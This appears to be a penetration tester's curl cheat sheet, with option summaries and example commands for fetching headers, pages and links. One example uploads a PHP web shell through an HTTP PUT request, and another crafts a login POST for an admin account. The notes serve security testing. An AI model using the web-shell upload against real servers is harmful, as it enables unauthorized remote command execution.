# curl

## Options

`-d <data>` Sends  the specified data in a POST request to the HTTP server.
`-H <header>` Extra header to include in information sent.
`-i` Include the HTTP response headers in the output.
`-I` Fetch the headers only.
`-X <method>` Specifies the request method to use when communicating with the HTTP server.

## Examples

Get Header

	curl -I $TARGET_URL

Get everything

	curl -i $TARGET_URL

Get everything; follow redirect

	curl -i -L  $TARGET_URL

Check for title and all links

	curl -s -L $TARGET_URL | grep "title\|href" | sed -e 's/^[[:space:]]*//'

Look at page with just text

	curl -s -L $TARGET_URL | html2text -width '99' | uniq

Check if it is possible to upload using put
		
	curl -v -X OPTIONS http:/$TARGET_IP
	curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http:/$TARGET_IP/test/shell.php

Crafting a POST request against the login API

	curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

	